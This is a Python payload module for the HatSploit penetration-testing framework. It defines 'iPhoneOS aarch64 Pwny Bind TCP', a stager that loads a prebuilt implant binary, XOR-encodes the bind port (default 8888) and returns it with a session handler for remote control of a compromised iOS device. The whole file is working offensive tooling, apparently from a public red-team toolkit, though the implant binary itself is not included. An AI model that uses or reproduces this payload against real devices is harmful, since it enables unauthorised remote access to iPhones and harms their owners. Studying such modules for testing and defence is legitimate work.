#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.payload import Payload
from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from data.pwny.iphoneos.session import HatSploitSession


class HatSploitPayload(Payload, StringTools, TCPClient):
    details = {
        'Category': "stager",
        'Name': "iPhoneOS aarch64 Pwny Bind TCP",
        'Payload': "iphoneos/aarch64/pwny_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Pwny bind TCP payload for iPhoneOS aarch64.",
        'Comments': [
            ''
        ],
        'Architecture': "aarch64",
        'Platform': "iphoneos",
        'Risk': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        bind_port = self.parse_options(self.options)
        bind_port = self.xor_string(bind_port)

        self.output_process("Generating payload...")
        with open('data/pwny/iphoneos/aarch64/pwny', 'rb') as f:
            payload = f.read()

        return payload, f"bind '{bind_port}'", HatSploitSession
